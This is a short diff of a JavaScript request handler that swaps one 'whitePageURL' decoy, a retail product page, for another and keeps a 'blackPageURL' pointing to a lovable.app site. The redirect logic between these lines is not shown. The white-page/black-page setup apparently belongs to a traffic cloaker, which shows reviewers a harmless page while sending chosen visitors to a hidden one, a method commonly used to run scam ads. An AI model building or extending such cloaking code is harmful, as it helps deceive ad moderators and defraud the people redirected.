@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://atelierchoux.com/en-int/products/carre-carousel-pink";
+    const whitePageURL = "https://www.desertcart.at/products/172108675-kurtzy-baby-safety-gate-for-door-and-staircase-with-child";
     const blackPageURL = "https://casssshlov.lovable.app/";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
